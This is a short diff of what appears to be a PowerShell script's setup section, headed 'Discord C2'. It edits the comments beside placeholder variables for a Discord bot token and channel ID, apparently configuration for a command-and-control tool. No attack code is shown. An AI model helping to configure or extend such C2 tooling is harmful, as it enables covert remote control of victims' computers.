@@ -1,8 +1,8 @@
 
 # ================================================================ Discord C2 ======================================================================
 
-$token = "$tk" # make sure your bot is in the same server as the webhook
-$chan = "$ch" # make sure the bot AND webhook can access this channel
+$token = "$tk" # Discord BOT Token - make sure your bot is in the server you want to use
+$chan = "$ch" # Discord Channel ID - make sure the bot can access this channel
 
 # =============================================================== SCRIPT SETUP =========================================================================
 
